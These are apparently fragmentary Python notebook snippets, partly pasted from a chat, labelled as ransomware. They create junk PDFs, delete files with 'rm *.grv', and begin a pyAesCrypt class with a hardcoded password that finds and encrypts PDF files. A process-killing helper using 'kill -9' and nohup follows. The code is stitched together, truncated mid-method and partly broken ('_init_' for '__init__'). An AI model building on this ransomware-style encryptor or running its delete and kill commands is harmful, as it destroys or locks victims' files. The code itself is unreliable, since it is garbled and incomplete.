import os #ransomware encrypting files
from subprocess import PIPE, run

def cmd(command):
  result = run(command, stdout=PIPE, universal_newlines=True, shell=True)
  return result.stdout
with open("new_file.pdf","w") as outp:
   outp.write("this is goutham")
def junk_file_creator(count):
  for number in range(count):
    with open(f"file_{number}.pdf","w") as outp:
      outp.write(f"i created this file {number}today")
junk_file_creator(10)
def delete_file(extension):
  cmd(f"rm *.{extension}")

delete_file("grv")
import pyAesCrypt #to import a module py(thon) Aes(encrypt algo) Crypt(hidden lang) pre-written code
from subprocess import PIPE, run

def cmd(command):
    result = run(command, stdout=PIPE, universal_newlines=True, shell=True)
    return result.stdout

class Lock_files:

    def _init_(self):
        self.password = "gaurav"
        self.bufferSize = 64 * 1024
        self.list_of_files = []
        self.list_of_enc_files= [] 

    def get_all_grv_files(self):
        self.list_of_files = cmd("find *.pdf").split()
        return True
    
    def get_all_encrypted_file(self):
        self.list_of_enc_files = cmd("find *.aes").split()
        return True

    def encrypt_files(self):
        got_grv_files = self.get_all_grv_files()
        if got_grv_files:…
!pip install pyAesCrypt
import os
from subprocess import PIPE, run

def cmd(command):
    result = run(command, stdout=PIPE, universal_newlines=True, shell=True)
    return result.stdout

class StallProgram:

    def _init_(self):
        self.process_id = []
    
    def get_process_id(self):
        pid_info = cmd("ps -ef|grep counter.py")
        pids = pid_info.split("\n")
        print(pids)
        for process in pids:
            self.process_id.append(process.split()[1]) if len(process) > 1 else print(None)
    def kill_process(self):
        for process in self.process_id:
            cmd(f"kill -9 {process}")
[6:34 pm, 29/10/2020] Gautam: stall_obj = StallProgram()
stall_obj.get_process_id()
stall_obj.kill_process()
 with open("counter.py","w") as outp:
   outp.write("")
 cmd("ps -ef")
 !nohup python3 counter.py &

